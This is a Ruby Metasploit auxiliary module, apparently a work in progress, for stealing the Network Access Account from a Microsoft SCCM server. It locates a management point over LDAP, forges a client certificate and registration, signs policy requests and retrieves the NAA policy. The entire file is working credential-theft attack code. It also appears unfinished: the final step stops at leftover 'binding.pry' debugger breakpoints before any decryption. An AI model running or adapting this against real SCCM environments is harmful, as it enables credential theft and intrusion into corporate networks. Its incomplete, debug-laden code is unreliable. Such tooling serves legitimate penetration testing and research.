##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'pry-byebug'
require 'time'
require 'nokogiri'
require 'rasn1'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::LDAP
  include Msf::OptionalSession::LDAP

  KEY_SIZE = 2048

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Get NAA Creds',
        'Description' => %q{
          This module attempts to retrieve the Network Access Account, if configured, from the SCCM server.
          This requires a computer account, which can be added using the samr_account module.
        },
        'Author' => [
          'smashery' # module author
        ],
        'References' => [
          ['URL', 'https://github.com/Mayyhem/SharpSCCM'],
          ['URL', 'https://github.com/garrettfoster13/sccmhunter']
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('COMPUTER_USER', [ true, 'The username of a computer account' ]),
      OptString.new('COMPUTER_PASS', [ true, 'The password of the provided computer account' ]),
      OptString.new('MANAGEMENT_POINT', [ false, 'The management point to use' ]),
    ])
  end

  def fail_with_ldap_error(message)
    ldap_result = @ldap.get_operation_result.table
    return if ldap_result[:code] == 0

    print_error(message)
    if ldap_result[:code] == 16
      fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist. Ensure you are targeting a domain controller running at least Server 2016.')
    else
      validate_query_result!(ldap_result)
    end
  end

  def find_management_point
    raw_objects = @ldap.search(base: @base_dn, filter: '(objectclass=mssmsmanagementpoint)', attributes: ['*'])
    return nil unless raw_objects.any?

    raw_obj = raw_objects.first

    raw_objects.each do |ro|
      print_good("Found Management Point: #{ro[:dnshostname].first} (Site code: #{ro[:mssmssitecode].first})")
    end

    if raw_objects.length > 1
      print_warning("Found more than one Management Point. Using the first (#{raw_obj[:dnshostname].first})")
    end

    obj = {}
    obj[:rhost] = raw_obj[:dnshostname].first
    obj[:sitecode] = raw_obj[:mssmssitecode].first

    obj
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        if (@base_dn = ldap.base_dn)
          print_status("#{ldap.peerinfo} Discovered base DN: #{@base_dn}")
        else
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      mp = datastore['MANAGEMENT_POINT']
      if mp.blank?
        begin
          mp = find_management_point
          fail_with(Failure::NotFound, 'Failed to find management point') unless mp
        rescue ::IOError => e
          fail_with(Failure::UnexpectedReply, e.message)
        end
      end

      key, cert = generate_key_and_cert('ConfigMgr Client')

      http_opts = {
        'rhost' => mp[:rhost],
        'rport' => 80,
        'username' => datastore['COMPUTER_USER'],
        'password' => datastore['COMPUTER_PASS'],
        'headers' => {'User-Agent' => 'ConfigMgr Messaging HTTP Sender',
                      'Accept-Encoding' => 'gzip, deflate',
                      'Accept' => '*/*',
                      'Connection' => 'Keep-Alive'
                     }
      }

      sms_id = register_request(http_opts, mp, key, cert)
      duration = 5
      print_line("Waiting #{duration} seconds for SCCM DB to update...")
      sleep(duration)
      naa_policy_url = get_policies(http_opts, mp, key, cert, sms_id)
      request_policy(http_opts, naa_policy_url, sms_id, key)
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def request_policy(http_opts, policy_url, sms_id, key)
    policy_url.gsub!('http://<mp>','')
    policy_url = policy_url.gsub('{','%7B').gsub('}','%7D')

    now = Time.now.utc.iso8601
    client_token = "GUID:#{sms_id};#{now};2"
    client_signature = rsa_sign(key, (client_token+"\x00").encode('utf-16le').bytes.pack('C*'))

    opts = http_opts.merge({
        'uri' => policy_url,
        'method' => 'GET',
    })
    opts['headers'] = opts['headers'].merge({
      'ClientToken' => client_token,
      'ClientTokenSignature' => client_signature
    })

    http_response = send_request_cgi(opts)
    http_response.gzip_decode!

    binding.pry
    ci = Rex::Proto::CryptoAsn1::Cms::ContentInfo.parse(http_response.body)
    e = ci.enveloped_data
    binding.pry
  end

  def get_policies(http_opts, mp, key, cert, sms_id)
    computer_user = datastore['COMPUTER_USER'].delete_suffix('$')
    fqdn = "#{computer_user}.#{datastore['DOMAIN']}"
    hex_pub_key = make_ms_pubkey(cert.public_key)
    guid = SecureRandom.uuid.upcase
    sent_time = Time.now.utc.iso8601
    site_code = mp[:sitecode]
    sccm_host = mp[:rhost].downcase
    request_assignments = "<RequestAssignments SchemaVersion=\"1.00\" ACK=\"false\" RequestType=\"Always\"><Identification><Machine><ClientID>GUID:#{sms_id}</ClientID><FQDN>#{fqdn}</FQDN><NetBIOSName>#{computer_user}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:#{site_code}</PolicySource><Resource ResourceType=\"Machine\" /><ServerCookie /></RequestAssignments>\x00"
    request_assignments.encode!('utf-16le')
    body_length = request_assignments.bytes.length
    request_assignments = request_assignments.bytes.pack('C*') + "\r\n"
    compressed = Rex::Text.zlib_deflate(request_assignments)

    payload_signature = rsa_sign(key, compressed)

    client_id = "GUID:{#{sms_id.upcase}}\x00"
    client_ids_signature = rsa_sign(key, client_id.encode('utf-16le'))
    header = "<Msg ReplyCompression=\"zlib\" SchemaVersion=\"1.1\"><Body Type=\"ByteRange\" Length=\"#{body_length}\" Offset=\"0\" /><CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID><Hooks><Hook2 Name=\"clientauth\"><Property Name=\"AuthSenderMachine\">#{computer_user}</Property><Property Name=\"PublicKey\">#{hex_pub_key}</Property><Property Name=\"ClientIDSignature\">#{client_ids_signature}</Property><Property Name=\"PayloadSignature\">#{payload_signature}</Property><Property Name=\"ClientCapabilities\">NonSSL</Property><Property Name=\"HashAlgorithm\">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name=\"zlib-compress\" /></Hooks><ID>{#{guid}}</ID><Payload Type=\"inline\" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:#{computer_user}:SccmMessaging</ReplyTo><SentTime>#{sent_time}</SentTime><SourceID>GUID:#{sms_id}</SourceID><SourceHost>#{computer_user}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>#{sccm_host}</TargetHost><Timeout>60000</Timeout></Msg>"

    message = Rex::MIME::Message.new
    message.bound = 'aAbBcCdDv1234567890VxXyYzZ'

    message.add_part(("\ufeff#{header}").encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
    message.add_part(compressed, 'application/octet-stream', 'binary')
    opts = http_opts.merge({
        'uri' => '/ccm_system/request',
        'method' => 'CCM_POST',
        'data' => message.to_s
    })
    opts['headers'] = opts['headers'].merge({
      'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"',
    })
    http_response = send_request_cgi(opts)
    response = Rex::MIME::Message.new(http_response.to_s)

    compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
    xml_doc = Nokogiri::XML(compressed_response.encode('utf-8'))
    naa_policy_url = xml_doc.xpath("//Policy[@PolicyCategory='NAAConfig']/PolicyLocation/text()").text
    if naa_policy_url.blank?
      fail_with(Failure::UnexpectedReply, 'Did not retrieve NAA Policy path')
    end

    print_good("Got NAA Policy URL: #{naa_policy_url}")

    naa_policy_url
  end

  def rsa_sign(key, data)
    signature = key.sign(OpenSSL::Digest::SHA256.new, data)
    signature.reverse!

    signature.unpack('H*')[0].upcase
  end

  def make_ms_pubkey(pub_key)
    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb
    result = "\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31"
    result += [KEY_SIZE, pub_key.e].pack('II')
    result += [pub_key.n.to_s(16)].pack('H*')

    result.unpack('H*')[0]
  end

  def register_request(http_opts, mp, key, cert)
    pub_key = cert.to_der.unpack('H*')[0].upcase

    computer_user = datastore['COMPUTER_USER'].delete_suffix('$')
    fqdn = "#{computer_user}.#{datastore['DOMAIN']}"
    sent_time = Time.now.utc.iso8601
    registration_request_data = "<Data HashAlgorithm=\"1.2.840.113549.1.1.11\" SMSID=\"\" RequestType=\"Registration\" TimeStamp=\"#{sent_time}\"><AgentInformation AgentIdentity=\"CCMSetup.exe\" AgentVersion=\"5.00.8325.0000\" AgentType=\"0\" /><Certificates><Encryption Encoding=\"HexBinary\" KeyType=\"1\">#{pub_key}</Encryption><Signing Encoding=\"HexBinary\" KeyType=\"1\">#{pub_key}</Signing></Certificates><DiscoveryProperties><Property Name=\"Netbios Name\" Value=\"#{computer_user}\" /><Property Name=\"FQ Name\" Value=\"#{fqdn}\" /><Property Name=\"Locale ID\" Value=\"1033\" /><Property Name=\"InternetFlag\" Value=\"0\" /></DiscoveryProperties></Data>"

    signature = rsa_sign(key, registration_request_data.encode('utf-16le'))

    registration_request = "<ClientRegistrationRequest>#{registration_request_data}<Signature><SignatureValue>#{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"

    rr_utf16 = ''
    rr_utf16 << registration_request.encode('utf-16le').bytes.pack('C*')
    body_length = rr_utf16.length
    rr_utf16 << "\r\n"

    header = "<Msg ReplyCompression=\"zlib\" SchemaVersion=\"1.1\"><Body Type=\"ByteRange\" Length=\"#{body_length}\" Offset=\"0\" /><CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID><Hooks><Hook3 Name=\"zlib-compress\" /></Hooks><ID>{5DD100CD-DF1D-45F5-BA17-A327F43465F8}</ID><Payload Type=\"inline\" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:#{computer_user}:SccmMessaging</ReplyTo><SentTime>#{sent_time}</SentTime><SourceHost>#{computer_user}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>#{mp[:rhost].downcase}</TargetHost><Timeout>60000</Timeout></Msg>"

    message = Rex::MIME::Message.new
    message.bound = 'aAbBcCdDv1234567890VxXyYzZ'

    message.add_part(("\ufeff#{header}").encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
    message.add_part(Rex::Text.zlib_deflate(rr_utf16), 'application/octet-stream', 'binary')

    opts = http_opts.merge({
        'uri' => '/ccm_system_windowsauth/request',
        'method' => 'CCM_POST',
        'data' => message.to_s
    })
    opts['headers'] = opts['headers'].merge({
      'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"',
    })
    response = send_request_cgi(opts)
    response = Rex::MIME::Message.new(response.to_s)

    header_response = response.parts[0].content.force_encoding('utf-16le').encode('utf-8').delete_prefix("\uFEFF")
    compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
    xml_doc = Nokogiri::XML(compressed_response.encode('utf-8')) # It's crazy, but XML parsing doesn't work with UTF-16-encoded strings
    sms_id = xml_doc.root&.attributes['SMSID']&.value&.delete_prefix('GUID:')
    if sms_id.nil?
      fail_with(Failure::UnexpectedReply, 'Did not retrieve SMS ID')
    end
    print_good("Got SMS ID: #{sms_id}")

    sms_id
  end

  def generate_key_and_cert(subject)
    key = OpenSSL::PKey::RSA.new(KEY_SIZE)
    cert = OpenSSL::X509::Certificate.new
    cert.version = 2
    cert.serial = (rand(0xFFFFFFFF) << 32) + rand(0xFFFFFFFF)
    cert.public_key = key.public_key
    cert.issuer = OpenSSL::X509::Name.new([['CN', subject]])
    cert.subject = OpenSSL::X509::Name.new([['CN', subject]])
    yr = 24 * 3600 * 365
    cert.not_before = Time.at(Time.now.to_i - rand(yr * 3) - yr)
    cert.not_after = Time.at(cert.not_before.to_i + (rand(4..9) * yr))
    ef = OpenSSL::X509::ExtensionFactory.new
    ef.subject_certificate = cert
    ef.issuer_certificate = cert
    cert.extensions = [
      ef.create_extension('keyUsage', 'digitalSignature,dataEncipherment'),
      ef.create_extension('extendedKeyUsage', '1.3.6.1.4.1.311.101.2, 1.3.6.1.4.1.311.101'),
    ]
    cert.sign(key, OpenSSL::Digest.new('SHA256'))

    [key, cert]
  end
end
